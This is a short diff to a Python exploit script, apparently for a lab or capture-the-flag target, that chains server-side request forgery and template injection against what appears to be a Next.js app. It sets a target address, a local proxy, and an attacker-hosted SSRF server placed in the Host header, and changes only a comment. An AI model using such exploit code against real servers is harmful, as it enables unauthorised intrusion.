@@ -33,7 +33,7 @@ import requests
 def ssrf_ssti():
     proxies={"http":"http://127.0.0.1:8080"}
     url="94.237.49.212:38383"  # Replace Target url
-    SSRF_HOST="54.157.213.44:5000"  # Replace with your ssrf host
+    SSRF_HOST="54.157.213.44:5000"  # Replace with the public server ip where you are hosting the script above
     headers={
         "Host":f"{SSRF_HOST}",    
         "Next-Router-State-Tree":"%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
